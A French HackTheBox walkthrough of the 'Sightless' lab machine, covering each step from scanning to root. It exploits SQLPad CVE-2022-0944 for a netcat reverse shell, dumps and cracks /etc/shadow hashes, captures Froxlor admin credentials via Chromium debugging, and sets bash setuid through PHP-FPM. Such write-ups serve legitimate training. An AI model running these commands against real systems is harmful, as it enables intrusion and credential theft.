---
title: Sightless
tags: [HackTheBox, Facile, Attaque, Linux, SQLPad, Froxlor, Docker]
style: border
color: htb
comments: false
description: Sixième semaine de la saison 6 "HEIST"
created: 14/09/2024
modified: 18/03/2025
---
> **IMPORTANT** : Ce compte-rendu a été rédigé la semaine où la machine était active durant la saison, mais publié à la fin de la saison afin de ne pas impacter son déroulement conformément aux [règles de la plateforme](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)

Lien vers l'épreuve : <https://app.hackthebox.com/machines/Sightless>

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=hackthebox)

## Sommaire <!-- omit in toc -->

* [Reconnaissance](#reconnaissance)
* [Analyse du site](#analyse-du-site)
* [Exploration](#exploration)
* [Elevation de privilèges](#elevation-de-privilèges)

## Reconnaissance

```bash
nmap -T4 -A sightless.htb
```

{% capture spoil %}
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 15:21 CEST
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/14%Time=66E58DFB%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.56 seconds
{% endcapture %}
{% include elements/spoil.html %}

Le scan {% include dictionary.html word="NMAP" %} indique qu'il y a un serveur {% include dictionary.html word="FTP" %} sur le port 21 (qui ne semble pas accessible par les utilisateurs anonymes), un serveur {% include dictionary.html word="SSH" %} sur le port 22 et un serveur Nginx sur le port 80

## Analyse du site

Une rapide analyse du site nous indique que le serveur utilise SQLPad et Froxlor. Nous allons pouvoir chercher des vulnérabilités sur ces outils

{% include elements/figure_spoil.html image="/images/HTB/20240914/Capture_ecran_2024-09-14_sightless.png" caption="Les services proposés" %}

En explorant SQLPad, il n'apparaît pas de nécessité de connexion pour y accéder. La version utilisée 6.10.0 est vulnérable à l'injection de code, documentée dans le [CVE-2022-0944](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb).

Pour exploiter cette vulnérabilité, nous utilisons le code fourni par l'utilisateur [0xRoqeeb](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) sur Github

Pour l'utiliser, nous lançons le programme avec la commande :

```bash
python3 exploit.py http://sqlpad.sightless.htb 10.10.14.84 9000
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```

En utilisant {% include dictionary.html word="Netcat" %}, nous obtenons un *{% include dictionary.html word="reverse-shell" %}*

```bash
nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.84] from (UNKNOWN) [10.10.11.32] 33330
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```

## Exploration

Bien que nous soyons root sur la machine, il apparaît que nous sommes en réalité dans container Docker

```bash
ls -hal /
total 88K
drwxr-xr-x   1 root root 4.0K Aug  2 09:30 .
drwxr-xr-x   1 root root 4.0K Aug  2 09:30 ..
-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
[... expurgé pour brièveté ...]
-rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint
[... expurgé pour brièveté ...]
```

Nous allons donc devoir trouver un moyen d'échapper à l'environnement, et atteindre le serveur qui fait tourner cet outil.

En explorant le container, nous constatons qu'il existe un compte pour un utilisateur "michael". Nous pouvons récupérer le hash de son mot de passe ainsi que celui du compte root en lisant le fichier /etc/shadow

```bash
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTIT[... expurgé ...]0LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
[... expurgé pour brièveté ...]
michael:$6$mG3Cp2VPGY.FDE8u$KVWVI[... expurgé ...]aFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

Nous récupérons les hashes dans un fichier texte, et nous lançons {% include dictionary.html word="Hashcat" %} afin de récupérer les mots de passe.

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTIT[... expurgé ...]0LGaepC3ch6Bb2z/lEpBM90Ra4b.:b[...expurgé...]e
michael:$6$mG3Cp2VPGY.FDE8u$KVWVI[... expurgé ...]aFYuJa6DUh/pL2IJD/:i[...expurgé...]e
```

Bien que la tentative de connexion au compte root soit infructueuse, nous sommes parvenu à nous connecter en {% include dictionary.html word="SSH" %} avec le mot de passe récupérer pour Michael

```bash
ssh root@sightless.htb
root@sightless.htb's password: 
Permission denied, please try again.
root@sightless.htb's password: 

ssh michael@sightless.htb
michael@sightless.htb's password: 
Last login: Sat Sep 14 14:42:08 2024 from 10.10.14.102
michael@sightless:~$
```

Nous pouvons récupérer le flag user :

```bash
cat user.txt 
bd6ac9[...expurgé...]b7e8ea
```

## Elevation de privilèges

L'utilisateur ne peut pas faire de commande {% include dictionary.html word="sudo" %}, la crontab n'est pas alimentée. La recherche de binaires disposant de droits particuliers ne donne pas de résultat intéressant non plus.

En revanche, en listant les ports ouverts, nous constatons que le port 8080 est ouvert :

```bash
netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
[... expurgé pour brièveté ...]
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
[... expurgé pour brièveté ...]
```

Nous ouvrons donc une connexion {% include dictionary.html word="SSH" %} avec redirection de port pour pouvoir analyser le contenu.

Le service ouvert est Froxlor, et nécessite des identifiants

{% include elements/figure_spoil.html image="/images/HTB/20240914/Capture_ecran_2024-09-14_Froxlor.png" caption="Accueil de Froxlor" %}

Nous tentons d'utiliser la payload du [CVE-2024-34070](https://github.com/advisories/GHSA-x525-54hf-xr53) sans succès, sûrement dû à l'absence d'interaction par un administrateur.

En tentant d'exploiter une faille de Google Chrome / Chromium avec la commande `chrome://inspect/#devices` et en ajoutant les ports ouverts (et forwardés) dans le menu *Configure* nous observons des actions de connexion sur l'outil Froxlor :

{% include elements/figure_spoil.html image="/images/HTB/20240914/Capture_ecran_2024-09-14_Chromium.png" caption="Chromium nous permet d'observer des actions sur l'outil Froxlor" %}

En cliquant sur "inspect" nous pouvons accéder aux outils d'analyse du réseau de Chromium où nous trouvons une page `index.php` qui contient en *payload* les données de connexions pour Froxlor :

```txt
loginname: admin
password: For[... expurgé ...]Admin
dologin:
```

Nous pouvons enfin accéder à l'outil :

{% include elements/figure_spoil.html image="/images/HTB/20240914/VirtualBox_Kali Hack_14_09_2024_19_26_26.png" caption="Interface de l'outil Froxlor" %}

Depuis l'onglet PHP / PHP-FPM versions nous pouvons ajouter une commande lors du redémarrage de php-fpm. Dans le but de devenir root sur la machine, nous optons pour `chmod 4777 /bin/bash` afin de permettre de devenir root en exécutant `/bin/bash -p` en étant connecter en tant que Michael.

En redémarrant le service PHP-FPM, le binaire /bin/bash a bien changé de droits

```bash
# Avant
ls -hal /bin/bash
-rwxr-xr-x 1 root root 1.4M Mar 14  2024 /bin/bash

# Après
ls -hal /bin/bash
-rwsrwxrwx 1 root root 1.4M Mar 14  2024 /bin/bash
```

Nous pouvons élever nos droits et devenir root. Ainsi nous pouvons récupérer le flag root.txt

```bash
/bin/bash -p
bash-5.1# id
uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael)
bash-5.1# cat /root/root.txt 
6c41fa[... expurgé ...]685ef4
```
